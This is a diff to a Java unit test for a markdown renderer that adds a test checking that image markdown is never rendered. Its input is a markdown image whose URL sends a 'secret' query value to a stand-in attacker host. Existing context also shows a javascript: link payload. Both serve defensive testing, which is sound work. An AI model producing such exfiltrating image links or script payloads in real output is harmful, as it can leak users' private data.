@@ -17,6 +17,16 @@ class MarkdownRendererTest {
     }
 
     @Test
+    void neverEmitsImages() {
+        // An image URL is a request the browser makes on its own: data exfiltration if the CSP is
+        // not enforced (e.g. the IE fallback of the SWT Browser).
+        String html = renderer.toHtml("veja ![dados](https://evil.example/x.png?q=segredo)");
+        assertFalse(html.contains("<img"), html);
+        assertFalse(html.contains("src="), html);
+        assertTrue(html.contains("dados"), html);
+    }
+
+    @Test
     void sanitizesJavascriptLinks() {
         String html = renderer.toHtml("[clique](javascript:alert(1))");
         assertFalse(html.contains("javascript:"), html);
